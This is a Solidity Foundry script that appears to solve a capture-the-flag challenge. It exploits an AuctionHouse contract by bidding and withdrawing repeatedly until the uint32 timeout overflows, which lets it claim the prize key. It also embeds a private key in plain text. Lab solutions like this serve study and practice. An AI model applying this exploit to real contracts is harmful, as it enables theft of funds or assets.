// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0xd5628881916f6FA85dCeb9797BB39788f5bCE720);
    address wallet = 0x380693A51e126802090e9fa02e833c93d1D7b3cE;
    AuctionHouse public target = setup.TARGET();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0xbd14f129367779fc91dbc5d7cd5450b03fd1f689400439d5767aee1e523e6b43);

        console.log(wallet.balance);

        console.log(uint32(block.timestamp) > target.timeout());

        console.log(target.timeout());

        Hack hack = new Hack(payable(address(target)));
        hack.attack{value: 25 ether}();
        console.log(target.timeout());

        console.log(uint32(block.timestamp) > target.timeout());

        console.log(setup.isSolved(wallet));

        vm.stopBroadcast();
    }
}

//  "PrivateKey": "0xbd14f129367779fc91dbc5d7cd5450b03fd1f689400439d5767aee1e523e6b43",
//     "Address": "0x380693A51e126802090e9fa02e833c93d1D7b3cE",
//     "TargetAddress": "0x79EfE8E383Cb912C71A461F0193A442AcFB8dF7d",
//     "setupAddress": "0xd5628881916f6FA85dCeb9797BB39788f5bCE720"

contract Hack {
    AuctionHouse public target;

    constructor(address _target) {
        target = AuctionHouse(payable(_target));
    }

    function attack() external payable {
        for(uint256 i = 0; i < 15; i++) {
            HelperHack hh = new HelperHack(address(target));
            hh.fullAttack{value: 1 ether}();
        }
        HelperHack hh = new HelperHack(address(target));
        hh.attack{value: 1 ether}();
        hh.win();
    }

    receive() external payable {}    
}

contract HelperHack {
    AuctionHouse public target;

    constructor(address _target) {
        target = AuctionHouse(payable(_target));
    }

    function attack() public payable {
        (bool sent,) = address(target).call{value: msg.value}("");
        require(sent);
    }

    function fullAttack() external payable {
        attack();
        target.withdrawFromAuction();
    }

    function win() external {
        target.claimPrize();
        target.keyTransfer(tx.origin);
    }

    receive() external payable {}
}

contract Setup {
    AuctionHouse public immutable TARGET;

    constructor() payable {
        require(msg.value == 1 ether);
        TARGET = new AuctionHouse{value: .5 ether}();
    }

    function isSolved(address player) public view returns (bool) {
        return TARGET.keyOwner() == player;
    }
}

contract AuctionHouse {
    struct Key {
        address owner;
    }

    struct Bidder {
        address addr;
        uint64 bid;
    }

    Key private phoenixKey = Key(address(0));
    uint32 public timeout;
    Bidder[] public bidders;
    mapping(address => bool) private blacklisted;
    uint32 public constant YEAR = 31556926;

    constructor() payable {
        timeout = uint32(block.timestamp);
        _newBidder(msg.sender, 0.5 ether);
    }

    receive() external payable {
        if ((uint64(msg.value) >= 2 * topBidder().bid) && (msg.sender != topBidder().addr) && (!blacklisted[msg.sender])&& (_isPayable(msg.sender))) {
            _newBidder(msg.sender, uint64(msg.value));
            timeout += YEAR;
        }
    }

    function keyOwner() external view returns (address) {
        return phoenixKey.owner;
    }

    function keyTransfer(address _newOwner) external {
        require(msg.sender == phoenixKey.owner);
        phoenixKey.owner = _newOwner;
    }

    function topBidder() public view returns (Bidder memory) {
        return bidders[bidders.length - 1];
    }

    modifier topBidderOnly() {
        require(msg.sender == topBidder().addr);
        _;
    }

    function withdrawFromAuction() public topBidderOnly {
        Bidder memory withdrawer = topBidder();
        bidders.pop();

        (bool success,) = payable(withdrawer.addr).call{value: withdrawer.bid / 2}("");
        if (success) {
            blacklisted[withdrawer.addr] = true;
            blacklisted[tx.origin] = true;
        }
    }

    function claimPrize() public topBidderOnly {
        require(uint32(block.timestamp) > timeout, "Still locked");
        require(phoenixKey.owner == address(0));
        phoenixKey.owner = topBidder().addr;
    }

    function _newBidder(address _address, uint64 _bid) private {
        bidders.push(Bidder(_address, _bid));
    }

    function _isPayable(address _address) private returns (bool) {
        (bool success,) = payable(_address).call{value: 0}("");
        return success;
    }
}